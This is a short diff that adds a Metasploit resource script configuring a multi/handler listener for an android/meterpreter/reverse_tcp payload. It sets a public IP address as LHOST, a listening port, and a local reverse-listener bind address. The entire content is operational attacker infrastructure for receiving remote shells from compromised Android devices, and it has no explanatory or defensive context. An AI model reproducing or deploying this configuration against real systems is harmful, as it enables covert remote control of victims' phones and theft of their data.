@@ -1,0 +1,8 @@
+ 
+use exploit/multi/handler 
+set payload android/meterpreter/reverse_tcp
+set LHOST  65.0.50.125
+set LPORT  11222 
+set reverselistenerbindaddress 127.0.0.1
+set reverselistenerbindPort 4444
+
